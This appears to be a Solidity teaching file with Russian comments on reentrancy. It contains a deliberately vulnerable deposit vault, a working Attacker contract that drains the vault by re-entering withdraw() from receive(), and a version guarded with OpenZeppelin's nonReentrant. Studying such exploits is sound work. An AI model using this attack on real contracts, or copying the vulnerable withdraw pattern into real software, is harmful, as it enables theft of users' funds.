/// SPDX-License-Identifier: MIT

pragma solidity ^0.8.30;

contract DepositVault {

    mapping(address => uint256) private balances; //1 ether

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "ETH transfer failed");

        //Attacker контракт выполняет функцию receive

        balances[msg.sender] = 0;
    }

    function userBalance(address _user) external view returns(uint256) {
        return balances[_user];
    }

    function vaultBalance() external view returns(uint256) {
        return address(this).balance;
    }
}

interface IDepositVault {
    function deposit() external payable;
    function withdraw() external;
}



contract Attacker {

    IDepositVault public attackedVault;

    constructor(IDepositVault _vaultAddress) {
        attackedVault = _vaultAddress;
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Msg.value should be 1 ether");
        attackedVault.deposit{value: 1 ether}();

        attackedVault.withdraw();
    }

    receive() external payable {
        if (address(attackedVault).balance >= 1 ether) {
            attackedVault.withdraw();
        }
    }

    /// ОЖИДАЕМОЕ ПОВЕДЕНИЕ

    /// 1. вызываем attack() передаем 1 ether
    /// 2. происхотдит deposit()
    /// 3. происходит withdraw()
    ///     3.1 вынимаем amount c меппинга balances
    ///     3.2 трансферим amount на адрес msg.sender
    ///     3.3 обновляем mapping balances

     /// ФАКТИЧЕСКОЕ ПОВЕДЕНИЕ

    /// 1. вызываем attack() передаем 1 ether
    /// 2. происхотдит deposit()

    /// 3. происходит withdraw(). 
    ///     3.1 вынимаем amount c меппинга balances
    ///     3.2 трансферим amount на адрес msg.sender
    ///         3.2.1 отарабатывает функция receive()
    ///         3.2.2 еще раз срабатывает функция withdraw() /// НАЧИНАЕТСЯ ВЕЧНЫЙ ЦИК
    ///                                                      ПОКА НА БАЛАНСЕ АТАКУЕМОГО
    ///                                                      ЕСТЬ СРЕЛДСТВА
    ///     3.3 обновляем mapping balances
}

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract DepositVaultWithoutReentrnacy is ReentrancyGuard {
    
    mapping(address => uint256) private balances; //1 ether

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    ///ПРАВИЛЬНЫЕ СПОСОБЫ ЗАЩИТЫ ОТ REENTRANCY
    /// 1. CHECKS -> EFFECTS - INTERACTIONS
    /// заптись balances[msg.sender] = 0 перед трансфером 

    /// 2. ReentrancyGuard.sol от OpenZeppelin

    function withdraw() nonReentrant external {
        // require(tx.origin == msg.sender, "msg.sender is not tx.origin"); НЕ САМЫЙ ПРАВИЛЬНЫЙ СПОСОБ
        // require(msg.sender.code.length == 0, "msg.sender is contract"); НЕ САМЫЙ ПРАВИЛЬНЫЙ СПОСОБ
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");

                                        //call для перевода средств = анлимитед газ
                                        // transfer / send = в таком случае у нас будет лимит по газу.
                                        // => пытаться уйти от call = не всегда правильно
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "ETH transfer failed");

        balances[msg.sender] = 0;
    }

    function userBalance(address _user) external view returns(uint256) {
        return balances[_user];
    }

    function vaultBalance() external view returns(uint256) {
        return address(this).balance;
    }
}

//nonReentrant 

//начинаем выполнять функцию помеченую как nonReentrant
//создается "флаг", который помечает, что функция выполняется сейчас
//если флаг активен - повторный вызов функции будет отменен (require)(=
//https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.3.0/contracts/utils/ReentrancyGuard.sol